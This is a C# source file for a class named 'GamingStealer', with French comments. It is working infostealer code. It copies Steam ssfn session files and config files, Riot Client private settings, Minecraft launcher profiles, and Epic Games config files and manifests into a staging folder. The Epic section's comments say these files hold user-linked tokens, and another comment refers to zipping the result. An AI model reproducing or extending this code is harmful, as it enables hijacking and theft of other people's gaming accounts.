using System;
using System.IO;
using Microsoft.Win32;

namespace Shifting_Backrooms.Utils // Remplace "TonProjet" par le nom de ton projet
{
    public class GamingStealer
    {
        public static void CaptureGamingSessions(string workDir)
        {
            string gamingDir = Path.Combine(workDir, "Gaming");
            Directory.CreateDirectory(gamingDir);

            // --- STEAM ---
            try
            {
                string steamPath = Registry.GetValue(@"HKEY_CURRENT_USER\Software\Valve\Steam", "SteamPath", null) as string;
                if (!string.IsNullOrEmpty(steamPath) && Directory.Exists(steamPath))
                {
                    string dest = Path.Combine(gamingDir, "Steam");
                    Directory.CreateDirectory(dest);
                    foreach (string f in Directory.GetFiles(steamPath, "ssfn*")) File.Copy(f, Path.Combine(dest, Path.GetFileName(f)), true);
                    string cfg = Path.Combine(steamPath, "config");
                    if (Directory.Exists(cfg)) foreach (string f in Directory.GetFiles(cfg, "*.vdf")) File.Copy(f, Path.Combine(dest, Path.GetFileName(f)), true);
                }
            }
            catch { }

            // --- RIOT GAMES ---
            try
            {
                string riot = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Riot Games", "Riot Client", "Data");
                if (Directory.Exists(riot))
                {
                    string dest = Path.Combine(gamingDir, "Riot");
                    Directory.CreateDirectory(dest);
                    string yaml = Path.Combine(riot, "RiotClientPrivateSettings.yaml");
                    if (File.Exists(yaml)) File.Copy(yaml, Path.Combine(dest, "RiotSettings.yaml"), true);
                }
            }
            catch { }

            // --- MINECRAFT ---
            try
            {
                string mc = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".minecraft");
                if (Directory.Exists(mc))
                {
                    string dest = Path.Combine(gamingDir, "Minecraft");
                    Directory.CreateDirectory(dest);
                    string json = Path.Combine(mc, "launcher_profiles.json");
                    if (File.Exists(json)) File.Copy(json, Path.Combine(dest, "launcher_profiles.json"), true);
                }
            }
            catch { }

            // --- MODULE EPIC GAMES ULTRA-ROBUSTE ---
            try
            {
                Console.WriteLine("[?] Recherche approfondie Epic Games...");
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string destFolder = Path.Combine(gamingDir, "EpicGames");

                // Liste des chemins potentiels où Epic stocke ses données
                string[] potentialPaths = new string[]
                {
                    Path.Combine(localAppData, "EpicGamesLauncher", "Saved"),
                    Path.Combine(localAppData, "EpicGamesLauncher", "Saved", "Config", "Windows"),
                    Path.Combine(localAppData, "Epic", "SocialPanel", "Saved"),
                    Path.Combine(localAppData, "EOSManager", "Saved")
                };

                bool foundSomething = false;

                foreach (string path in potentialPaths)
                {
                    if (Directory.Exists(path))
                    {
                        if (!Directory.Exists(destFolder)) Directory.CreateDirectory(destFolder);
                        foundSomething = true;

                        // On copie tout ce qui est utile (.ini pour les comptes, .json pour les manifests)
                        string[] fileExtensions = { "*.ini", "*.json", "*.log" };
                        foreach (string ext in fileExtensions)
                        {
                            foreach (string file in Directory.GetFiles(path, ext, SearchOption.AllDirectories))
                            {
                                try
                                {
                                    string fileName = Path.GetFileName(file);
                                    // On évite les noms trop longs pour le ZIP
                                    File.Copy(file, Path.Combine(destFolder, fileName), true);
                                }
                                catch { }
                            }
                        }
                    }
                }

                // --- LE TRUC CRUCIAL : LES MANIFESTS D'INSTALLATION ---
                // C'est ici qu'on voit les jeux et les tokens liés à l'utilisateur
                string manifestsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Epic", "EpicGamesLauncher", "Data", "Manifests");
                if (Directory.Exists(manifestsPath))
                {
                    if (!Directory.Exists(destFolder)) Directory.CreateDirectory(destFolder);
                    string manifestDest = Path.Combine(destFolder, "Manifests");
                    Directory.CreateDirectory(manifestDest);

                    foreach (string file in Directory.GetFiles(manifestsPath, "*.item"))
                    {
                        try { File.Copy(file, Path.Combine(manifestDest, Path.GetFileName(file)), true); } catch { }
                    }
                    foundSomething = true;
                }

                if (foundSomething)
                {
                    Console.WriteLine("[+] Epic Games : Données extraites avec succès.");
                }
                else
                {
                    // Si même là il trouve rien, c'est que Epic n'est vraiment pas sur ce PC
                    Console.WriteLine("[-] Epic Games : Aucun dossier de session détecté après scan complet.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Erreur Epic : " + ex.Message);
            }
        }
    }
}